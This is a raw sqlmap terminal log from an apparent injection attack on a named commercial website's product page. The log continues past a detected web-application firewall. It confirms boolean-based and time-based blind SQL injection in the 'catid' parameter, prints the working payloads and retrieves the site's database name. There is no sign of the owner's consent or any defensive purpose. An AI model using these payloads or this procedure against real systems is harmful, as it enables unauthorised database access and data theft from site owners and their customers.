http://www.vinayagacalendars.com/products.php?catid=49
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.5.151#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:28 /2019-06-01/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[10:46:29] [INFO] testing connection to the target URL
[10:46:30] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:46:30] [CRITICAL] WAF/IPS identified as 'ModSecurity (Trustwave)'
are you sure that you want to continue with further target testing? [Y/n] Y
[10:46:30] [WARNING] please consider usage of tamper scripts (option '--tamper')
[10:46:30] [INFO] testing if the target URL content is stable
[10:46:31] [INFO] target URL content is stable
[10:46:31] [INFO] testing if GET parameter 'catid' is dynamic
[10:46:32] [INFO] GET parameter 'catid' appears to be dynamic
[10:46:33] [WARNING] reflective value(s) found and filtering out
[10:46:34] [WARNING] heuristic (basic) test shows that GET parameter 'catid' might not be injectable
[10:46:35] [INFO] heuristic (XSS) test shows that GET parameter 'catid' might be vulnerable to cross-site scripting (XSS) attacks
[10:46:35] [INFO] testing for SQL injection on GET parameter 'catid'
[10:46:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:46:54] [INFO] GET parameter 'catid' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="\u20b9.5600")
[10:46:57] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[10:46:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:46:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:46:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:46:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:46:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:46:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:46:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:46:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:46:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:46:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:46:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:57] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:46:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:46:58] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:46:58] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:46:58] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:46:58] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:46:58] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:46:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:46:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:46:58] [INFO] testing 'MySQL inline queries'
[10:46:58] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[10:46:58] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[10:46:58] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[10:46:59] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[10:46:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:46:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:46:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:46:59] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[10:46:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:48:00] [INFO] GET parameter 'catid' appears to be 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' injectable 
[10:48:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:48:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:48:00] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:48:03] [INFO] target URL appears to have 21 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[10:48:27] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[10:48:28] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[10:48:29] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[10:48:30] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[10:48:31] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[10:48:33] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[10:48:34] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[10:48:50] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[10:48:51] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[10:48:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[10:48:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:48:54] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[10:48:55] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[10:48:57] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[10:49:13] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[10:49:14] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[10:49:15] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[10:49:16] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[10:49:17] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[10:49:18] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[10:49:19] [INFO] checking if the injection point on GET parameter 'catid' is a false positive
GET parameter 'catid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 679 HTTP(s) requests:
---
Parameter: catid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catid=49' AND 5974=5974-- NpHZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: catid=49' AND SLEEP(5)-- gBuR
---
[10:49:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.0.12
[10:49:30] [INFO] fetching database names
[10:49:30] [INFO] fetching number of databases
[10:49:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:49:30] [INFO] retrieved: 
[10:49:30] [WARNING] unexpected HTTP code '406' detected. Will use (extra) validation step in similar cases

[10:49:30] [INFO] retrieved: 
[10:49:30] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[10:49:31] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[10:49:31] [ERROR] unable to retrieve the number of databases
[10:49:31] [INFO] falling back to current database
[10:49:31] [INFO] fetching current database
[10:49:31] [INFO] retrieved: vinayaga_vinayagacalendar
available databases [1]:
[*] vinayaga_vinayagacalendar

[10:50:34] [WARNING] HTTP error codes detected during run:
406 (Not Acceptable) - 600 times
[10:50:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.vinayagacalendars.com'

[*] ending @ 10:50:34 /2019-06-01/

